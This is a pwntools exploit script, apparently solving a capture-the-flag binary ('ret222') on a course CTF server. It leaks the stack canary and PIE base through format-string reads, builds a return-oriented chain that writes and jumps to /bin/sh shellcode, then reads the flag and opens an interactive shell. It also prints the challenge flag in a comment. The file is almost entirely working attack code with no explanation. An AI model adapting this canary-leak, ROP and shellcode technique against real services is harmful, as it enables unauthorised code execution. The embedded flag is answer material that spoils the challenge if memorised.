#!/usr/bin/env python2
# -*- coding: ascii -*-
from pwn import *
import sys

# FLAG{YOU_ARE_REALLY_SMART!!!!!!}

context.arch = 'amd64'

e = ELF('./ret222')

host , port = 'csie.ctf.tw' , 10122

y = remote(host,port)


def set_name( name ):
    y.sendafter( '>' , '1\n' )
    y.sendafter( 'name:' , name )

def set_data( data ):
    y.sendafter( '>' , '3\n' )
    y.sendafter( 'data:' , data + '\n' )


def sho():
    y.sendafter( '>' , '2\n' ) 

name = 0x202020
gets = 0x908
pop_rdi = 0xda3
main = 0xc00

set_name( '%23$p\n\n' )
sho()

y.recvuntil('Name:')
canary = p64( int( y.recvline().strip() , 16 ) )
log.success( 'Canary -> {}'.format( hex( u64( canary ) ) ) )

set_name( '%24$p\n\n' )
sho()

y.recvuntil('Name:')
pie = int( y.recvline().strip() , 16 ) - 0xd40
log.success( 'PIE -> {}'.format( hex( pie ) ) )

p = 'a' * 0x88
p += flat(
    canary,
    'RBBBBBBP',
    pie + pop_rdi,
    pie + name,
    pie + gets,
    pie + main
) 

set_data( p )

y.sendafter( '>' , '4\n' )

sc = '\x48\x31\xf6\x48\x31\xd2\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\x6a\x3b\x58\x0f\x05'

sleep(1)
y.sendline( sc )
sleep(1)

p = 'a' * 0x88
p += flat(
    canary,
    'RBBBBBBP',
    pie + name,
) 

set_data( p )

y.sendafter( '>' , '4\n' )

y.sendline( 'cat /home/`whoami`/flag' )


y.interactive()

